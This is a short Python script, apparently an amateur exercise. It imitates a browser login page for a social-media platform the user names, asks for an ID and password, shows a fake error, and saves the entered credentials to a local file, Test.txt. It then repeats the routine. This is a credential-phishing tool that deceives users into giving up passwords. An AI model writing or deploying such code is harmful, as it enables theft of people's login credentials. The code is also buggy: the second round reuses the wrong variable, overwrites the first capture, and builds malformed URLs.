import random
import io
BrowserName = input("ENTER THE BROWSER NAME : ")
print(f"WellCome To {BrowserName} Browser !!!")

Platform = input("ENTER THE SOCIAL MEDIA PLATFORM : ")
FirstName = ['https.','http.','www.']
Lastname = ['.com','.in','.online']
x = random.choice(FirstName)
y = random.choice(Lastname)
print(x+Platform+y)

print("Log In Now!!!")
Id = input("Enter ID : ")
Password = input("Enter The Password : ")

print("!!!!!!!!!!!Error Found!!!!!!!!!")
print("Try Another platform.")

with open("Test.txt",'w') as f:
    text = f.write(f"""Browser : {BrowserName}\nPlatform : {Platform}
ID : {Id}
Password : {Password}""")
f.close()

BrowserName1 = input("ENTER THE BROWSER NAME : ")
print(f"WellCome To {BrowserName1} Browser !!!")

Platform1 = input("ENTER THE SOCIAL MEDIA PLATFORM : ")
FirstName = ['https.','http.','www.']
Lastname = ['.com','.in','.online']
x = random.choice(FirstName)
y = random.choice(Lastname)
print(x+Platform+y)

print("Log In Now!!!")
Id1 = input("Enter ID : ")
Password1 = input("Enter The Password : ")

print("!!!!!!!!!!!Error Found!!!!!!!!!")

with open("Test.txt",'w') as f:
    text = f.write(f"""Browser : {BrowserName1}\nPlatform : {Platform1}
ID : {Id1}
Password : {Password1}""")
f.close()



